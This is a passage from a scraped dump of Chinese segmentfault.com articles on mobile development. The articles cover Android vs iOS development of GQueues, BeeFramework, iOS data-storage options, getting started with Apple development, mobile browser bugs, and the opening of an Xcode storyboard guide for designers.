<p>严格来讲，Core Data并不完全支持事务。通过使用单独的子ManagedObjectContexts做后台线程处理，再加上@synchronized，能够处理好数据更新和同步，同时避免不正确的写操作覆盖(overwrite)。关于<a rel=""nofollow"" href=""https://developer.apple.com/library/ios/#documentation/Cocoa/Conceptual/CoreData/Articles/cdImporting.html"">高效更新和创建对象</a>，iOS给的建议帮助很小，总的来说，CoreData给我的赶脚很笨重，并没有它声称的那么好用。另外，在Android上，SQLite可以轻松实现快速加载Smart Queues，而在iOS上，所有的过滤都必须在代码中实现，就算用了大量的缓存，速度仍然很慢。</p>

<h4>搜索</h4>

<p>在GQueues for Android上增加强大的全文搜索功能很简单，我模仿Google I/O应用里面的搜索实现，使用了SQLite的 <a rel=""nofollow"" href=""http://www.sqlite.org/fts3.html"">FTS3</a> 特性。首先创建一个虚拟表，然后在一个存储了用户任务的表上设置几个触发器，由这些触发器填充数据到虚拟表。做完了这些，剩下的就是设计一个搜索界面和为搜索历史添加存储。</p>

<p>iOS的Core Data对于全文搜索并没有原生支持，所以我通过在谓词（Predicate）中使用LIKE语句，实现基本的任务描述和日记的搜索功能。这个实现当然没有全文搜索那么强大，但我认为它已经能够覆盖现实生活中大部分的使用场景了。</p>

<h4>特性API</h4>

<p>用于比较，我只会列举在GQueues中使用到的几个API。</p>

<h3>快速添加（Quick Add）</h3>

<p>正则表达式在实现GQueues中 <a rel=""nofollow"" href=""http://www.gqueues.com/help/quickAdd"">Quick Add</a>解析的时候扮演着一个非常重要的角色，幸运的是，Android和iOS对于正则表达式都有着原生的支持。Android中的Pattern和Matcher从第一个版本起就开始支持，同时也包含了很多正则语法，其中包括前向断言（look-ahead assertion）和后向断言（look-behind assertion）。iOS则从iOS 4开始引入<a rel=""nofollow"" href=""https://developer.apple.com/library/ios/#documentation/Foundation/Reference/NSRegularExpression_Class/Reference/Reference.html"">NSRegularExpression</a>类，令人高兴的是，我可以把我在Android上辛辛苦苦写好的正则表达式几乎原封不动地搬到了iOS上。</p>

<h4>分页</h4>

<p>在设计界面的时候，我希望用户在查看任务详细的时候左右滑动切换。在Android上我用了 ViewPager和新的FragmentStatePagerAdapter类，FragmentStatePagerAdapter还处于试验阶段，并且只能通过支持库（Support Library）来使用。我花了几天的时间实现了一个绑定好数据的初级版本，同时解决了几个关于重复菜单项的bug和在数据发生变化后的处理。这些比我预想的要困难很多，要不是因为左右滑动切换任务的用户体验那么好的话，我真不想实现这个功能。iOS上的UIPageViewController就简单很多了，虽然也有一些奇怪问题要解决，并且需要自己再加上缓存支持使滑动复杂视图的时候达到可用状态。</p>

<h4>语音输入</h4>

<p>Android提供了了一个先进但很容易使用的speech-to-text API，只用20行代码，我就把<a rel=""nofollow"" href=""http://developer.android.com/reference/android/speech/RecognizerIntent.html"">RecognizerIntent</a>集成到GQueues，提供了一个<a rel=""nofollow"" href=""http://www.gqueues.com/help/android#voice"">自定义的语音输入功能</a>。但很遗憾，iOS并没有提供支撑SIRI背后技术的API，开发者只能使用第三方库，依赖键盘上的麦克风提供语音输入的支持。我找了各种第三方库，包括<a rel=""nofollow"" href=""http://appleinsider.com/articles/13/05/30/nuance-confirms-its-technology-is-behind-apples-siri"">Nuance</a> - SIRI语音识别的提供商，但发现没有免费版本，收费版本价格不菲。所以最后GQueues只能靠用户自己使用键盘上内置的麦克风选项来进行语音输入，其实这也已经足够了，只要用户还记得有这么个功能。</p>

<h4>分享/插件(小部件)</h4>

<p>通过使用Intent，在Android上可以很容易就可以把我的应用集成到安装在用户手机上的其他应用。同样地，只需要很少的代码，通过支持<a rel=""nofollow"" href=""http://developer.android.com/training/sharing/receive.html"">ACTION_SEND</a> intent，我就能够让用户在其他应用中创建GQueues任务。Android同时也提供了一个小部件平台，于是我也做了几个小部件，以后还会增加一些。iOS对于跨应用集成和桌面小部件的支持度为零，完全不支持这两个功能。</p>

<h4>测试和发布</h4>

<h3>beta测试</h3>

<p>在上面的统计概况表中已经指出，beta版面向真实用户测试了一个多月。两组测试人员都非常棒，帮我找到了数十计的bug，提出了增加一些特性的建议，对一些UI上不合理的地方提出了反馈。我通过私有的Google Group组织beta测试，这样的beta测试保证了最后发布的应用对人们是真正有用的。在每次beta测试的最后，通过调查问卷我收集到了很多有建设性的反馈，也帮助进一步判断我的应用是否达到了可发布的状态。</p>

<p>让测试者开始测试只需要发个APK的链接，让他们下载到他们机器上（呃..他们还需要在设置界面中开启“允许安装Google Play以外的应用”的选项）。Google很方便地支持用真实用户来进行alpha和beta测试，可在<a rel=""nofollow"" href=""https://support.google.com/googleplay/android-developer/answer/3131213?hl=en"">开发者控制台和阶段推广</a>中进行设置。在未来的版本更新中我想用用这两个功能。</p>

<p>iOS中的beta测试困难得多，就算用了 <a rel=""nofollow"" href=""http://testflightapp.com/"">TestFlight</a>服务，虽然TestFlight很大程度地简化了流程。为了满足Apple的控制欲，每部测试设备的UUID都要加到用于签名beta版应用的证书当中。因此，每次要添加beta测试者的时候，不论是添加一个人还是一群人，我都需要重新build一遍我的app。除此之外，Apple还限制了你一年最多只能注册100个测试设备。所以我要小心利用好这100个坑，这也是为什么GQueues的iOS测试者只有Android的一半。</p>

<h3>发布</h3>

<p>当然，不谈谈发布流程，Android和iOS的比较都不算完，在Google Play上发布GQueues是一件很好玩的事情，只要我认为已经准备好了，我随时可以发布我的应用。点下按钮之后，30分钟内，我的应用就能在Google Play上被全世界的用户找到并安装到他们的设备上。而在App Store上发布一款应用，相信每个iOS开发者都有同样的感受，那是一个令人感到郁闷的经历。经过了数月紧张严密的编码，我只能把我的创作提交给Apple，然后等7天，7天之后审核人员花2分钟看看我的应用，最后拒绝了我的提交。我只能按要求做了修改之后再次提交，我又得等8天才在最后通过了审核。当然还有很多关于提交应用到App Store的恐怖故事，跟他们比起来，我就像是公园里逛了一圈。尽管如此，在自己的商业控制上要对这样一个“情绪化的第三方平台”做出那么多的让步，仍然让我觉得很不爽。</p>

<h3>获胜的平台</h3>

<p>从上面的分析来看，做GQueues的过程中，并没有出现平台A完胜平台B的情况。Android和iOS在某些领域各有千秋，也都有需要改进的地方。从这两个平台的历史来看，貌似目前Android势头更猛一些，不止体现在市场占有率上，而是看到了Android近两年在UI上的改进和开发平台的稳步提升。而Apple则是封闭的王者，我也坚信他们在很努力地做着他们认为是下一代移动计算革命的事情。不管怎么说，当我想想这6年间所兴起的app生态圈，我为自己在这个移动技术快速更新的时代，能在这两个平台上做开发感到荣幸。</p>

<hr>

<p>原文：<a rel=""nofollow"" href=""http://blog.gqueues.com/2013/07/android-vs-ios-comparing-development.html"">Android vs. iOS: Comparing the Development Process of the GQueues Mobile Apps</a><br>
转载自：<a rel=""nofollow"" href=""http://blog.jobbole.com/54050/"">伯乐在线</a> - <a rel=""nofollow"" href=""http://blog.jobbole.com/author/neevek/"">neevek</a></p>

                ", Android 和 iOS 孰优孰劣：真实应用开发过程告诉你答案,1531972192,263,1,475,1,1,https://segmentfault.com/a/1190000000378906
197,1,0,6,"
                    
<p><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbGZF"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span></p>

<p>BeeFramework 是新一代的应用开发框架，它能使应用开发变得更简单更容易，它是由 <a rel=""nofollow"" href=""https://github.com/gavinkwoe"">Gavin Kwoe</a> 和 <a rel=""nofollow"" href=""https://github.com/qfish"">QFish</a> 开发并维护的。使用 BeeFramework 能像 html 和 css 那样，来对 iOS 应用进行原生排版辅助。</p>

<p>这是它的官网：<a rel=""nofollow"" href=""http://www.Bee-Framework.com"">http://www.Bee-Framework.com</a></p>

<hr>
<h3>架构：</h3>

<p><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbGZM"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span></p>

<hr>
<h3>功能列表</h3>

<p><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbGZZ"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span></p>

<hr>
<h3>它还提供一系列工具</h3>

<h4><a rel=""nofollow"" href=""http://ib.bee-framework.com/"">在线的界面生成器（Online interface builder）</a></h4>

<p><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbGZ5"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span></p>

<h4><a rel=""nofollow"" href=""https://github.com/gavinkwoe/BeeFramework/blob/master/tools"">API 代码生成器（API code generator）</a></h4>

<p><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbG0d"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span></p>

<h4><a rel=""nofollow"" href=""http://bee-framework.com/download/BeeFramework_SDK_0.4.0.pkg.zip"">官方 SDK</a></h4>

<p><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbG0h"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span></p>

<p>更多信息，可浏览项目<a rel=""nofollow"" href=""https://github.com/gavinkwoe/BeeFramework"">主页</a>。</p>

<hr>
<p>翻译整理：<a rel=""nofollow"" href=""http://segmentfault.com/"">Segmentfault</a></p>

                ", BeeFramework：以极客的方式开发你的应用,1531972193,495,1,497,1,1,https://segmentfault.com/a/1190000000364574
198,1,0,6,"
                    <p>你是用什么方法来持久保存数据的？这是在几乎每一次关于iOS技术的交流或讨论都会被提到的问题，而且大家对这个问题的热情持续高涨。本文主要从概念上把“数据存储”这个问题进行剖析，并且结合各自特点和适用场景给大家提供一个选择的思路，并不详细介绍某一种方式的技术细节。</p>

<p>谈到数据储存，首先要明确区分两个概念，数据结构和储存方式。所谓数据结构就是数据存在的形式。除了基本的NSDictionary、NSArray和NSSet这些对象，还有更复杂的如：关系模型、对象图和属性列表多种结构。而存储方式则简单的分为两种：内存与闪存。内存存储是临时的，运行时有效的，但效率高，而闪存则是一种持久化存储，但产生I/O消耗，效率相对低。把内存数据转移到闪存中进行持久化的操作称成为归档。</p>

<p>二者结合起来才是完整的数据存储方案，我们最常谈起的那些：SQLite、CoreData、NSUserDefaults等都是数据存储方案。当然在这些框架提供的方案之外，我们自己也可以按照个性化需求订制方案。这些存储方案侧重不同，支持的形式和方式也各不相同，在不同的使用场景下表现也是各有优劣。但万变不离其宗，无论什么方案都可以用下图来解释。</p>

<p><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbGHY"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""存储方案示意图""></span></p>

<p>图1，存储方案示意图</p>

<p>以下将对四种存储方式进行详细的介绍：</p>

<p>NSUserDefaults，用于存储配置信息<br>
SQLite，用于存储查询需求较多的数据<br>
CoreData，用于规划应用中的对象<br>
使用基本对象类型定制的个性化缓存方案<br>
用NSUserDefaults存储配置信息</p>

<p>NSUserDefaults被设计用来存储设备和应用的配置信息，它通过一个工厂方法返回默认的、也是最常用到的实例对象。这个对象中储存了系统中用户的配置信息，开发者可以通过这个实例对象对这些已有的信息进行修改，也可以按照自己的需求创建新的配置项。</p>

<p><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbGH0"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""UserDefaults结构""></span></p>

<p>图2，笔者手机中[NSUserDefaults standardUserDefaults]内容</p>

<p>NSUserDefaults把配置信息以字典的形式组织起来，支持字典的项包括：字符串或者是数组，除此之外还支持数字等基本格式。一句话概括就是：基础类型的小数据的字典。操作方法几乎与NSDictionary的操作方法无异，另外还可以通过指定返回类型的方法获取到指定类型的返回值。</p>

<p><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbGH1"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""方法列表""></span></p>

<p>图3，NSUserDefaults提供的指定返回类型的方法列表</p>

<p>NSUserDefaults的所有数据都放在内存里，因此操作速度很快，并还提供一个归档方法：+ (void)synchronize。开发者自定义的配置项（如图2中的最后一项 key:alkdjfkladsjfmm）会以plist格式的文件归档在相应应用目录的/Library/Preferences/[App_Bundle_Identifier].plist文件。再次初始化获得实例对象后，框架会把用户自定义的这个配置和系统配置合并得到完整数据。</p>

<p>用SQLite存储查询需求较多的数据</p>

<p>iOS的SDK里预置了SQLite的库，开发者可以自建SQLite数据库。SQLite每次写入数据都会产生IO消耗，把数据归档到相应的文件。</p>

<p>SQLite擅长处理的数据类型其实与NSUserDefaults差不多，也是基础类型的小数据，只是从组织形式上不同。开发者可以以关系型数据库的方式组织数据，使用SQL DML来管理数据。 一般来说应用中的格式化的文本类数据可以存放在数据库中，尤其是类似聊天记录、Timeline等这些具有条件查询和排序需求的数据。</p>

<p>每一个数据库的句柄都会在内存中都会被分配一段缓存，用于提高查询效率。另一个方面，由于查询缓存，当产生大量句柄或数据量较大时，会出现缓存过大，造成内存浪费。</p>

<p>SQLite的使用起来要比NSUserDefaults复杂的多，因此建议开发者使用SQLite要搭配一个操作控件使用，可以简化操作。笔者开发的SQLight是一款对SQLite操作的封装，把相对复杂的SQLite命令封装成对象和方法，可以供大家参考。大家可以在Github上获取这个工程的代码进一步了解。</p>

<p>用CoreData规划应用中对象</p>

<p>官方给出的定义是，一个支持持久化的，对象图和生命周期的自动化管理方案。严格意义上说CoreData是一个管理方案，他的持久化可以通过SQLite、XML或二进制文件储存。如官方定义所说，CoreData的作用远远不止储存数据这么简单，它可以把整个应用中的对象建模并进行自动化的管理。</p>

<p><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbGH2"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""CoreData""></span></p>

<p>图4，官方文档中解释CoreData给出的对象图示例</p>

<p>正如上图所示，MyDocument是一个对象实例，有两个Collection：Employee和Department，存放各自的对象列表。MyDocument、Employee和Department三个对象以及他们之间的关系都通过CoreData建模，并可以通过save方法进行持久化。</p>

<p>从归档文件还原模型时CoreData并不是一次性把整个模型中的所有数据都载入内存，而是根据运行时状态，把被调用到的对象实例载入内存。框架会自动控制这个过程，从而达到控制内存消耗，避免浪费。</p>

<p>无论从设计原理还是使用方法上看，CoreData都比较复杂。因此，如果仅仅是考虑缓存数据这个需求，CoreData绝对不是一个优选方案。CoreData的使用场景在于：整个应用使用CoreData规划，把应用内的数据通过CoreData建模，完全基于CoreData架构应用。</p>

<p>苹果官方给出的一个示例代码，结构相对简单，可以帮助大家入门CoreData。</p>

<p>使用基本对象类型定制的个性化缓存方案</p>

<p>之前提到的NSUserDefaults和SQLite适合存储基础类型的小数据，而CoreData则不适合存储单一的数据，那么对于类似图片这种较大的数据要用什么方式储存呢？我给出的建议就是：自己实现一套存储方案。说到订制存储方案大家非常容易质疑，这是不是又在重新发明轮子。我可以非常明确的告诉大家，这绝不是在重新发明轮子。首先要明确，这个所谓的定制方案适用于互联网应用中对远程数据的缓存，几个限制条件缺一不可。</p>

<p>从需求出发分析缓存数据有哪些要求：按Key查找，快速读取，写入不影响正常操作，不浪费内存，支持归档。这些都是基本需求，那么再进一步或许还需要固定缓存项数量，支持队列缓存，缓存过期等。从这些需求入手设计一个缓存方案并不十分复杂，Kache是笔者根据开发应用的需求开发的一套缓存组件，通过分析Kache希望可以给大家一个思路。</p>

<p><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbGH3"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""Kache""></span></p>

<p>图5，Kache架构图</p>

<p>如上图所示，Kache扮演的是一个典型缓存角色。应用加载远程数据生成应用数据对象的同时，通过Kache把数据缓存起来，再次请求则直接通过Kache获取数据。</p>

<p>缓存对象可以是NSDictionary、NSArray、NSSet或NSData这些可直接归档的类型，每个缓存对象对应一个Key。缓存对象包括数据和过期时间，内存中存放在一个单例字典中，闪存中每个对象存为一个文件。Key空间按照各种顺序存放缓存对象的Key集合，Pool为固定大小的数组，当数量达到上限，最早过期的一个Key将被删除，对应的缓存对象也被清除。Queue也是固定大小的数组，以先进先出的规则管理Key的增删。 每一次有新的缓存对象存入，自动检测Key空间中过期的集合并清除。</p>

<p>此外，控件提供save和load方法支持持久化和重新载入。</p>

<p>Kache最初设计为存放图片缓存，之后也曾用于缓存文本数据，由于使用了过期和归档相结合的逻辑，可以保证大部分命中的缓存对象都在内存中，从而获取了较高的效率。读者可以从Github上获取Kache源码了解更多。</p>

<p>以上介绍了几种iOS开发中经常会遇到的储存数据方法，从其存储原理、使用方式和适用场景几方面进行进了简单的对比。事实上每一款应用都很难采用一种单一的方案完成整个应用的数据储存任务，需要根据不同的数据类型，选择最合适的方案，以便整个应用获得良好的运行时性能。</p>

                ", 对比iOS中的四种数据存储,1531972195,241,1,895,1,1,https://segmentfault.com/a/1190000000363438
199,1,0,6,"
                    <p>其实这个主题早就想开始写了，一直到不到一个比较好的博客。前几天在segmentfault安家，这算是我的第一篇文章吧。</p>

<p>说到苹果开发，其实我也没有多大的资历来进行讲解。只是接触的早一些，从iOS3.X开始，就在学习使用了。期间经历过很多的学习资料，现在简单理清一下思路，方便后来者学习。大家有好的意见，也可以留言。</p>

<p>首先，苹果开发分为三种：</p>

<ol>
<li>一种是Mac OS X上的开发，就是桌面端；</li>
<li>一种是移动端的，也就是iOS；</li>
<li>当然还有网页端的，for safari</li>
</ol>

<p>Safari上的我基本没怎么接触。主要来说说Mac和iOS上的，我相信这也是初学者最关心的。</p>

<p>那么这两种开发使用的语言都是Objective-C，一种类C的语言。学起来也不是很难，容易上手。但是要理解真正的好处得花点功夫。以后我会开个系列专门讲解Objective-C。我建议初学者每天应该花一些时间来钻研一下Objective-C。但是不要等把它彻底学会才开始做开发，没必要的。因为苹果开发兼容C和C++。实在不行，就用C或者C++也能对付一段时间。</p>

<p>有了编程语言，那么framework用的是什么呢？Mac上用的是Cocoa，之前用的Cabin。iOS用的则是Cocoa Touch。两者是有区别的，但是区别越来越小。不过我们平时研发的时候，也不必过分在意这些区别。尤其是只在一端研发。</p>

<p>工具呢，就是Xcode了。现在Xcode把Interface Builder都整合进去了，比较方便。以前是分开的。</p>

<p>开发模式就是MVC了。模型Model，视图View，控制器Controller。无论是Mac上还是iOS上都是如此。</p>

<p>这些我们都知道了，那么怎么开始呢？首先，我们要准备材料。苹果开发比较麻烦的就是，我们只能在Mac OS X下进行开发，Mac OS X只能安装在苹果的电脑上。所以，你必须要有一个苹果的电脑，iMac啊，Mac Pro啊，Mac Book Pro啊，Air之类的。总之，要有一个。不要嫌弃苹果的电脑贵，其实算上软件的话（不要考虑盗版），苹果的电脑做开发在经济上还是很划算的。</p>

<p>然后，你还要去 <a rel=""nofollow"" href=""https://developer.apple.com/"">https://developer.apple.com/</a> 注册一个开发者帐号。这个要收费，个人是一年99美金。注册以后你可以把自己写好的iOS程序放在Device上调试。如果你不想这样，就可以不用注册收费帐号。反正现在Xcode下载也是免费的。程序调试可以用模拟器。</p>

<p>苹果的软件下载都去App Store上就可以了，不过你得有个苹果ID。注册一下，免费的。</p>

<p>好了，基本就绪。我们可以开始学习了。</p>

<p>学习方式，以iOS为例。英语好的，我建议你直接去看苹果文档，链接在这里：<a rel=""nofollow"" href=""https://developer.apple.com/library/ios/navigation/"">https://developer.apple.com/library/ios/navigation/</a></p>

<p>英语没底的，可以找本入门的中文书籍，最好是翻译过来的。先趟趟水，熟悉一下环境和专业术语。一本书学下来，基本小有成就。然后再去看文档。</p>

<p>为什么要看文档，而不是找什么教程呢？原因有几点：</p>

<ol>
<li>苹果的文档可读性非常好，并不是生硬的不懂人情的文档。通常图文并茂，还辅助以Sample code。</li>
<li>苹果的文档更新速度快，你能最快速接触到最新的更新。记得我以前看文档的时候，一个文档还没看完，就有更新了！不过不用担心每次更新你不知道什么，最新文档尾部会有更新日期和更新内容摘要，一目了然。这是教程和书籍都难以匹敌的。</li>
<li>苹果自己的技术，自己写的文档，自然不会出问题。有问题也迅速更新了。</li>
<li>全部的文档，都可以以PDF的格式下载下来。你可以存在任何地方进行查看学习。Sample code也可以查看得到哦， 也会定期更新哦。</li>
<li>分类清晰，结构明了。苹果的文档可以按照几种方式分类，不仅仅方便查找，更容易让你对结构进行更深入的理解。</li>
</ol>

<p>也许，还有许多好处吧。不过以上这些的理由很充分了。</p>

<p>如果文字真的让你感到无聊，那么还有一个视频教程可以供你学习。斯坦福大学的公开课，可以在iTunes U上免费下载。最近有个iOS 7的最新讲座。视频+课堂的PPT。我认为是最好的iOS视频讲座。不过都是英文的，运气好有英文字幕。英语不过硬的，看看PPT也不错，也是图文并茂，讲的非常好。</p>

<p>我对编程学习的原则就是，边学边用，理论和实践互相促进，在编码中学习理论，用理论指导编码。</p>

<p>今天就讲这么多，资历不深，有讲解不当的地方还望批评指出。</p>

<p>大家也可以看看这个链接，进一步了解一些基本内容：<a rel=""nofollow"" href=""https://developer.apple.com/cn/technologies/"">https://developer.apple.com/cn/technologies/</a></p>

<p>下次，我会从这儿讲起：<br>
<a rel=""nofollow"" href=""https://developer.apple.com/library/prerelease/ios/referencelibrary/GettingStarted/RoadMapiOSCh/chapters/Introduction.html"">https://developer.apple.com/library/prerelease/ios/referencelibrary/GettingStarted/RoadMapiOSCh/chapters/Introduction.html</a></p>

                ", 如何开始苹果开发,1531972197,583,1,939,1,1,https://segmentfault.com/a/1190000000363200
200,1,0,6,"
                    <p>前端开发的痛苦之一就是各种浏览器、各种设备的坑。<a rel=""nofollow"" href=""https://github.com/scottjehl/Device-Bugs/issues?state=open"">Device-Bugs</a>收集了移动端浏览器和设备在实现标准上的缺陷。大家来对号入座下，有没有在开发中遇到过？</p>

<p><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbGfp"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""bugs""></span></p>

<ol>
<li><p><a rel=""nofollow"" href=""https://github.com/scottjehl/Device-Bugs/issues/44"">Oprea Mini 加载页面后不会重绘 <code>:target CSS</code>指令。</a></p></li>
<li><p><a rel=""nofollow"" href=""https://github.com/scottjehl/Device-Bugs/issues/43"">Blackberry OS6 的 SVG 字体支持糟透了</a></p></li>
<li><p><a rel=""nofollow"" href=""https://github.com/scottjehl/Device-Bugs/issues/42"">Blackberry OS5 不支持<code>:before/:after</code>的 <code>background-image</code></a></p></li>
<li><p><a rel=""nofollow"" href=""https://github.com/scottjehl/Device-Bugs/issues/41"">设定<code>-webkit-appearance</code>会导致Android 4.0+ 影子DOM样式问题</a></p></li>
<li><p><a rel=""nofollow"" href=""https://github.com/scottjehl/Device-Bugs/issues/40"">iOS7 虚拟器： 无法清除Safari的cookies和数据</a></p></li>
<li><p><a rel=""nofollow"" href=""https://github.com/scottjehl/Device-Bugs/issues/39"">Android默认浏览器键盘Resize事件问题</a></p></li>
<li><p><a rel=""nofollow"" href=""https://github.com/scottjehl/Device-Bugs/issues/38"">后退时，iOS 禁用了iframe中的 Javascript</a></p></li>
<li><p><a rel=""nofollow"" href=""https://github.com/scottjehl/Device-Bugs/issues/36"">iOS 6-7 处理viewport相关的单位很诡异</a></p></li>
<li><p><a rel=""nofollow"" href=""https://github.com/scottjehl/Device-Bugs/issues/35"">spinner开启时，轻触与选中标签会导致键盘闪动</a></p></li>
<li><p><a rel=""nofollow"" href=""https://github.com/scottjehl/Device-Bugs/issues/34"">Android 4+ 上使用XHR2 发送Blob时发送的body为空</a></p></li>
<li><p><a rel=""nofollow"" href=""https://github.com/scottjehl/Device-Bugs/issues/33"">Android上<code>canvas.toDataURL('image/jpeg')</code>返回<code>image/png on Android</code></a></p></li>
<li><p><a rel=""nofollow"" href=""https://github.com/scottjehl/Device-Bugs/issues/31"">Galaxy Nexus上的Android Jelly Bean的浏览器中，<code>checkbox.attr('checked')</code>不会触发重绘</a></p></li>
<li><p><a rel=""nofollow"" href=""https://github.com/scottjehl/Device-Bugs/issues/30"">HTML 5 time input导致Samsung Galaxy 2 ICS的Android浏览器崩溃</a></p></li>
<li><p><a rel=""nofollow"" href=""https://github.com/scottjehl/Device-Bugs/issues/29"">chrome下HTML5历史错误</a></p></li>
<li><p><a rel=""nofollow"" href=""https://github.com/scottjehl/Device-Bugs/issues/28"">老旧的BlackBerry将rem units视为em</a></p></li>
<li><p><a rel=""nofollow"" href=""https://github.com/scottjehl/Device-Bugs/issues/27"">iOS &lt;= 6 的 Safari：当手动改变hash并移动到另一个hash后，URL栏会显示旧hash值</a></p></li>
<li><p><a rel=""nofollow"" href=""https://github.com/scottjehl/Device-Bugs/issues/26""><code>@media screen</code>和<code>max-width: 320px</code>问题</a></p></li>
<li><p><a rel=""nofollow"" href=""https://github.com/scottjehl/Device-Bugs/issues/25"">iOS5 日期选择器选定新日期时间后不会触发<code>change</code>事件</a></p></li>
<li><p><a rel=""nofollow"" href=""https://github.com/scottjehl/Device-Bugs/issues/24"">iOS5 文本框内的占位文本会切除过长的部分</a></p></li>
<li><p><a rel=""nofollow"" href=""https://github.com/scottjehl/Device-Bugs/issues/23"">使用JS滚动页面后，iOS 5 固定位置元素重定位错误</a></p></li>
<li><p><a rel=""nofollow"" href=""https://github.com/scottjehl/Device-Bugs/issues/22"">固定位置元素在BlackBerry 7虚拟器中会使浏览器崩溃</a></p></li>
<li><p><a rel=""nofollow"" href=""https://github.com/scottjehl/Device-Bugs/issues/21"">Android浏览器无法降级使用<code>font-family</code></a></p></li>
<li><p><a rel=""nofollow"" href=""https://github.com/scottjehl/Device-Bugs/issues/20"">Chrome Beta (Mobile) 不支持 keypress事件</a></p></li>
<li><p><a rel=""nofollow"" href=""https://github.com/scottjehl/Device-Bugs/issues/19"">Android 4.0.(1|2) 全宽固定位置元素的回流问题</a></p></li>
<li><p><a rel=""nofollow"" href=""https://github.com/scottjehl/Device-Bugs/issues/17"">iOS 5的<code>window.close</code>问题</a></p></li>
<li><p><a rel=""nofollow"" href=""https://github.com/scottjehl/Device-Bugs/issues/16"">选中菜单的Opera透明度问题</a></p></li>
<li><p><a rel=""nofollow"" href=""https://github.com/scottjehl/Device-Bugs/issues/15"">iOS中，使用向前或向后按钮离开时，表单的input和label元素会被加上悬停状态</a></p></li>
<li><p><a rel=""nofollow"" href=""https://github.com/scottjehl/Device-Bugs/issues/14""><code>-webkit-overflow-scrolling:touch</code> 不“遵守” z坐标</a></p></li>
<li><p><a rel=""nofollow"" href=""https://github.com/scottjehl/Device-Bugs/issues/13"">iOS: input标签不会聚焦到相应的字段</a></p></li>
<li><p><a rel=""nofollow"" href=""https://github.com/scottjehl/Device-Bugs/issues/12"">Android <code>-webkit-tap-highlight-color</code>在叠加区域的高亮问题</a></p></li>
</ol>

                ", 移动端浏览器30坑，你踩过几个？,1531972198,318,1,356,1,1,https://segmentfault.com/a/1190000000361663
201,1,0,6,"
                    <p><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbCS8"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span><br>
在过去的一个月，我每天早上 7 点起床，一直工作到晚上 7 点，在完成在 Carshare.hk 的那份全职工作之余，一直都在致力于完善那个 Ripple 应用。这个月全是关于 iOS 方面的经验，我面对的挑战是在年底前发布这个 iOS 应用之余，还要为之做些 设计师/前端 的工作。</p>

<p>下载 Xcode 开发原型：<br>
<a rel=""nofollow"" href=""http://cl.ly/2A0m0j0i0g1K"">http://cl.ly/2A0m0j0i0g1K</a></p>

<h3>拥抱 Xcode 故事板（Storyboard）</h3>

<p>在做应用的时候，我遇到一个很崇尚使用故事板的 iOS 开发牛人。我以前用过故事板来做原型设计，但我的梦想一直是做一个功能性的 iOS 应用。在他的帮助下，我终于能大大地简化了 iOS 开发，因为他会集中于更高级的交互设计，而我得以专心与每个像素的细节、动画和各处的设计布局。苹果的<a rel=""nofollow"" href=""https://developer.apple.com/library/ios/design/index.html#//apple_ref/doc/uid/TP40013289"">开发文档</a>是世界级的好质量，这对我来说是幸运的。另外，去 <a rel=""nofollow"" href=""http://stackoverflow.com/search?tab=newest&amp;q=xcode%20storyboard"">Stackoverflow</a>看看，会知道这个社区的人也很多。但这次，我们不用写代码。</p>

<h3>为设计师的简化</h3>

<p>作为一个不得不要在用户体验、视觉设计和前端这些内容中徘徊的设计师，我不希望事情是<a rel=""nofollow"" href=""http://www.ilounge.com/index.php/mac/entry/ken-segall-insanely-simple/"">复杂的</a>。因为有时候要成为一个高效的设计师，要能够说不。如果我需要学会整个 Objective-C 语言，那么我就会失去动力。在这个文章中，我不会说太复杂的东西，部分原因是觉得其他人已经在这方面<a rel=""nofollow"" href=""https://medium.com/building-potluck/7f493cdfa381"">做得很好</a>了。 相反，我会首先接触些设计师已经熟悉了的东西，然后在慢慢迈向故事板。</p>

<h3>iOS7 和 Xcode5</h3>

<p>在 iOS7 中，设觉设计发挥的作用已经不像<a rel=""nofollow"" href=""http://frankchimero.com/what-screens-want/"">从前那样</a>大了，这要求设计师更加注重风格背后的功能上。伴随着 iOS7 的重磅更新，苹果公司也发布了 Xcode5，一个比以往<a rel=""nofollow"" href=""https://developer.apple.com/library/ios/documentation/DeveloperTools/Conceptual/WhatsNewXcode/Articles/xcode_5_0.html"">更加易用的开发工具</a>。它新添了构件库(Assets Library)，自动配置工具(Automatic Configuration，可以更方便地在 iPhone 上测试)，快速打开（Open Quickly，就 SublimeText 的那样），SpriteKit，还有一些更稳定的故事板。</p>

<h3>开始使用 Xcode</h3>

<p><span class=""img-wrap""><img data-src=""http://segmentfault.com/img/bVbDmZ"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""请输入图片描述""></span><br>
安装 Xcode 后，创建一个新的项目。</p>

<hr>

